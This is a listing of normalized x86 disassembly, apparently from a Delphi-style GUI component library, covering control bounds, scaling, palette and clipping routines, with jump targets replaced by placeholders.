jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_4042a8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_4341ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_434a88
sub_4341cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_434a74
sub_4341ec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_43420c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41c4b8
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f320
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4351bc
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_433d2c
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_436074
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4342e4
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4034d8
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_453664
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034c0
push edi
xor ecx ecx
mov edx 0xb039
call sub_4362b4
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_434aac
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403360
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403164
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403164
mov eax [ edi + 0x68 ]
call sub_403164
mov eax [ edi + 0x64 ]
call sub_4086e0
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41c504
test bl bl
jle r-xdata
sub_4343b0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_4343d8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403360
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_434460
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_434760
sub_434480
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403164
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4370d0
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403360
mov edx ebx
mov eax edi
call sub_41c588
mov eax ebx
mov si 0xffd9
call sub_403360
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_434548
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41c918
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_4362b4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_4362b4
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_4362b4
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_4362b4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_4362b4
sub_4345dc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41c7d4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_4350c4
jmp r-xdata
xor edx edx
mov eax esi
call sub_434480
sub_434620
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403360
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_434460
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403360
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
sub_434688
je r-xdata
mov eax edi
mov si 0xffee
call sub_403360
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
mov eax edi
mov si 0xffd0
call sub_403360
pop edx
pop edi
pop esi
pop ebx
retn
sub_4346c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_436844
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_435554
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_434760
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_4362b4
mov eax ebx
mov si 0xffd0
call sub_403360
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403360
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_434760
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_43bbec
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_43487c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_4348a0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_4348c8
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_4348ec
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_434910
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_434a0b
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403360
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434a12
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_416c5c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403360
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403360
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_4169bc
sub_434a1c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_435554
mov edx edi
mov eax ebx
call sub_434acc
mov edx edi
mov eax ebx
call sub_436358
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_434a88
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403ef0
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_434acc
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_434b28
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_434b54
mov edx eax
mov ecx esp
mov eax esi
call sub_4156bc
mov edx esp
mov eax ebx
call sub_434f98
pop ecx
pop edx
pop esi
pop ebx
retn
sub_434b6c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_434b10
mov ecx esp
mov edx esi
call sub_4156bc
mov edx esp
mov eax ebx
call sub_434f98
pop ecx
pop edx
pop esi
pop ebx
retn
sub_434b94
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_434c15
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434c1c
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
call sub_4038d8
sub_434c24
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_434c50
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_434c7c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_44fbb8
sub_434cac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_4362b4
sub_434d28
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41f778
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_41f794
sub_434ef4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_434f8a
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41ca10
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43510c
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_4042a8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434f91
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43513c
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_434f98
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_434fe0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
test esi esi
je r-xdata
mov edx ebx
call sub_438560
mov edx ebx
mov eax esi
call sub_43848c
mov eax ebx
call sub_434760
sub_43502c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403360
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_4362b4
mov eax edi
mov si 0xffd0
call sub_403360
sub_4350c4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_448b34
mov edx ebx
mov eax esi
call sub_41c588
sub_4350e8
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_4362b4
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_4362b4
pop ebx
retn
sub_43510c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_435080
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_403f8c
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_435090
sub_43513c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_435191
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43510c
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4042a8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435198
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax esi
call sub_40435c
mov edx eax
mov eax ebx
call sub_4350e8
sub_4351bc
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41f6d4
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_4362b4
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41f6d4
mov [ ebx + 0x84 ] eax
sub_435344
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_435334
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_4322dc
mov eax esi
call sub_4322dc
jmp r-xdata
sub_43537c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_416b74
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_416a08
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_416b94
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_435554
mov eax ebx
call sub_44bb08
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403360
sub_4353fc
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_43537c
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_43537c
jmp r-xdata
sub_435420
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4354b6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4354bd
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0xc ]
